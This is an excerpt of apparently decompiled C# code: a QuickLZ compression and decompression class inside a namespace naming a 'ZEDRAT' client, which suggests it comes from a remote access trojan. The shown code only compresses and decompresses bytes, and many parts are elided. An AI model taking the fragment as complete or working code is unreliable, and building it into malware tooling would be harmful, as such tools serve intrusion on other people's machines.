...
namespace Client.ZEDRAT.Compression
{
	public static class SafeQuickLZ
	{
		...
		public static byte[] Compress(byte[] source, int level = 3)
		{
			...
			while (i <= num4)
			{
				if ((num2 & 1) == 1)
				{
					if (i > source.Length >> 1 && num > i - (i >> 5))
					{
						...
						SafeQuickLZ.WriteHeader(array5, level, compressible: false, source.Length, source.Length + 9);
						Array.Copy(source, 0, array5, 9, source.Length);
						return array5;
					}
					SafeQuickLZ.FastWrite(array2, i2, (int)(num2 >> 1) | int.MinValue, 4);
					i2 = num;
					num += 4;
					num2 = 2147483648u;
				}
				...
				if (num16 >= 3 && i - num18 < 131071)
				{
					...
					if (num16 == 3 && num19 <= 63)
					{
						SafeQuickLZ.FastWrite(array2, num, num19 << 2, 1);
						num++;
					}
					else if (num16 == 3 && num19 <= 16383)
					{
						SafeQuickLZ.FastWrite(array2, num, (num19 << 2) | 1, 2);
						num += 2;
					}
					else if (num16 <= 18 && num19 <= 1023)
					{
						SafeQuickLZ.FastWrite(array2, num, (num16 - 3 << 2) | (num19 << 6) | 2, 2);
						num += 2;
					}
					else if (num16 <= 33)
					{
						SafeQuickLZ.FastWrite(array2, num, (num16 - 2 << 2) | (num19 << 7) | 3, 3);
						num += 3;
					}
					else
					{
						SafeQuickLZ.FastWrite(array2, num, (num16 - 3 << 7) | (num19 << 15) | 3, 4);
						num += 4;
					}
					num5 = 0;
				}
			...
			SafeQuickLZ.FastWrite(array2, i2, (int)(num2 >> 1) | int.MinValue, 4);
			SafeQuickLZ.WriteHeader(array2, level, compressible: true, source.Length, num);
			array5 = new byte[num];
		...
		public static byte[] Decompress(byte[] source)
		{
			...
			while (true)
			{
				...
				if ((num5 & 1) == 1)
				{
					...
					if (num == 1)
					{
						num9 = (uint)array2[((int)num8 >> 4) & 0xFFF];
						if ((num8 & 0xFu) != 0)
						{
							num10 = (num8 & 0xF) + 2;
							num3 += 2;
					...
					else
					{
						...
						num9 = (uint)(num4 - num11);
					}
					array[num4] = array[num9];
					array[num4 + 1] = array[num9 + 1];
					array[num4 + 2] = array[num9 + 2];
					for (int i = 3; i < num10; i++)
					{
						array[num4 + i] = array[num9 + i];
					}
					num4 += (int)num10;
					if (num == 1)
					{
						...
						{
							num7++;
							int num12 = (int)(((num8 >> 12) ^ num8) & 0xFFF);
							array2[num12] = num7;
							array3[num12] = 1;
